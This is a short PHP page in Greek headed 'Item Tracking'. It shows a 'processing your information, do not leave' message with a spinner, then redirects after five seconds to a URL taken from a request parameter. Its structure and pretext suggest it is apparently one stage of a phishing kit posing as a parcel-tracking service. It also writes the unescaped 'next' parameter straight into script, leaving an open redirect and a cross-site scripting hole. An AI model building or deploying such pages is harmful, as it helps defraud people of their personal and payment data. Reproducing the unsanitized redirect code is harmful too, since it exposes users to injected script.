<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<div class="app">
<header>
    <img src="res/logo.png"> <span class="title">Εντοπισμός Αντικειμένου</span>
</header>

<main>

<div class="text">
<b>Γίνεται επεξεργασία των πληροφοριών σας...</b><br><br>
Παρακαλούμε μην αποχωρήσετε από αυτή τη σελίδα. Θα ανακατευθυνθείτε αυτόματα.
</div>

<img src="res/loading.gif" style="width:36px; margin:30px 0;">

</main>




<footer>
    <img src="res/footer-mobile.png" class="mobile">
    <img src="res/footer.png" class="pc">
</footer>
</div>

<script>

let target = "<?= @$_GET['next']; ?>";

setTimeout(() => {
    window.location=target;
}, 5000);


</script>
</body>
</html>